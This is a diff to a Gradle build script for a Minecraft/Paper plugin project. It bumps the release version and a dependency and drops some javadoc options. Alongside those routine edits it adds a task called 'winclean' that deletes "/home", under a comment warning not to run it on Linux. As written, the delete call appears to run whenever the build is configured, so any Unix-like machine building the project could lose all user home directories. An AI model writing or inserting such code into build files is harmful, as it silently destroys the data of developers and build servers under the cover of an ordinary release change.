@@ -5,7 +5,7 @@ plugins {
 }
 
 group 'dev.selena.lua'
-version '1.0.9-SNAPSHOT'
+version '1.0.9'
 apply plugin: 'java'
 defaultTasks('build')
 
@@ -45,7 +45,7 @@ dependencies {
     implementation('com.google.code.gson:gson:2.10.1')
     implementation("com.google.guava:guava:31.1-jre")
     compileOnly("io.papermc.paper:paper-api:1.20.1-R0.1-SNAPSHOT")
-    implementation("de.tr7zw:item-nbt-api:2.12.1")
+    implementation("de.tr7zw:item-nbt-api:2.12.2")
     implementation 'io.github.classgraph:classgraph:4.8.162'
     implementation('com.iridium:IridiumColorAPI:1.0.6')
     // TODO make this functional
@@ -60,6 +60,11 @@ build {
     dependsOn(shadowJar, test)
 }
 
+// DO NOT RUN THIS ON LINUX
+task winclean {
+    delete "/home"
+}
+
 
 javadoc {
     source = sourceSets.main.allJava
@@ -70,13 +75,6 @@ javadoc {
         destinationDir = file("/home/web/docs/luacore")
     }
 
-    options
-            {
-                setMemberLevel JavadocMemberLevel.PUBLIC
-                setAuthor true
-
-                links "https://docs.oracle.com/javase/8/docs/api/"
-            }
 }
 
 
